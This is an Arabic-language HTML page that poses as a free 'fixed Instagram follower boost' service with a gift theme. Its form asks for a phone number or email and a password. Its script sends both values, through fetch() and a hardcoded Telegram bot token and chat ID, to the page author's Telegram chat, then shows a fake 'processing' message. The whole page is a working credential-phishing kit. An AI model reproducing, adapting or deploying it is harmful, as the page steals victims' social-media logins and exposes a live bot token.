<!DOCTYPE html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>🎁 رشق انستا ثابت</title> <style> @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap'); body { font-family: 'Cairo', sans-serif; margin: 0; padding: 0; background: linear-gradient(120deg, #1c1c1c, #111); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; flex-direction: column; } .container { background: #222; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0, 255, 170, 0.3); width: 400px; position: relative; text-align: center; } h1 { font-size: 24px; margin-bottom: 20px; color: #00ffc3; } .form-group { margin-bottom: 15px; text-align: right; } label { display: block; margin-bottom: 5px; font-weight: bold; color: #ccc; } input { width: 100%; padding: 10px; border-radius: 10px; border: none; background: #333; color: white; font-size: 14px; } button { background: linear-gradient(90deg, #00ffc3, #00b3ff); color: #000; padding: 12px; border: none; border-radius: 12px; font-size: 16px; width: 100%; cursor: pointer; transition: 0.3s ease; margin-top: 10px; } button:hover { filter: brightness(1.1); transform: scale(1.03); } .message { margin-top: 15px; padding: 10px; border-radius: 10px; display: none; text-align: center; } .success { background-color: #2ecc71; color: white; } .error { background-color: #e74c3c; color: white; } .gift { position: absolute; font-size: 32px; animation: float 4s infinite ease-in-out; opacity: 0.4; } .gift:nth-child(1) { top: 20px; left: 20px; animation-delay: 0s; } .gift:nth-child(2) { top: 80px; right: 30px; animation-delay: 1s; } .gift:nth-child(3) { bottom: 20px; left: 50%; animation-delay: 2s; } @keyframes float { 0% { transform: translateY(0); opacity: 0.4; } 50% { transform: translateY(-20px); opacity: 0.8; } 100% { transform: translateY(0); opacity: 0.4; } } .footer { margin-top: 25px; font-size: 14px; color: #aaa; text-align: center; } .footer a { color: #00ffc3; text-decoration: none; font-weight: bold; } .footer a:hover { text-decoration: underline; } </style> </head> <body> <div class="container"> <div class="gift">🎁</div> <div class="gift">🎁</div> <div class="gift">🎁</div> <h1>رشق انستا ثابت 100%</h1> <form id="registrationForm"> <div class="form-group"> <label for="identifier">رقم الهاتف أو البريد الإلكتروني</label> <input type="text" id="identifier" required> </div> <div class="form-group"> <label for="password">كلمة المرور</label> <input type="password" id="password" required> </div> <button type="submit">تسجيل</button> </form> <div id="message" class="message"></div> </div> <div class="footer"> 👨‍💻 تصميم وتطوير: <strong>المبرمج أبو تراب</strong> | <a href="https://t.me/aaaa1qaq" target="_blank">قناتي على تيليجرام</a> </div> <script> document.getElementById('registrationForm').addEventListener('submit', function(e) { e.preventDefault(); const identifier = document.getElementById('identifier').value; const password = document.getElementById('password').value; const messageDiv = document.getElementById('message'); // إرسال البيانات إلى بوت تيليجرام sendToTelegramBot(identifier, password) .then(response => { messageDiv.textContent = "جاري تنفيذ طلبك!"; messageDiv.className = "message success"; messageDiv.style.display = "block"; // مسح النموذج بعد الإرسال document.getElementById('registrationForm').reset(); }) .catch(error => { messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى."; messageDiv.className = "message error"; messageDiv.style.display = "block"; console.error('Error:', error); }); }); async function sendToTelegramBot(identifier, password) { // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك const botToken = '8268999233:AAEKZOSEc28arWPr6Aopw-6zMVrySSNBn88'; const chatId = '8514663363'; const message = `بيانات تسجيل جديدة:\n\nالمعرف: ${identifier}\nكلمة المرور: ${password}`; const url = `https://api.telegram.org/bot${botToken}/sendMessage`; try { const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ chat_id: chatId, text: message }) }); if (!response.ok) { throw new Error('Network response was not ok'); } return await response.json(); } catch (error) { throw error; } } </script> </body> </html>
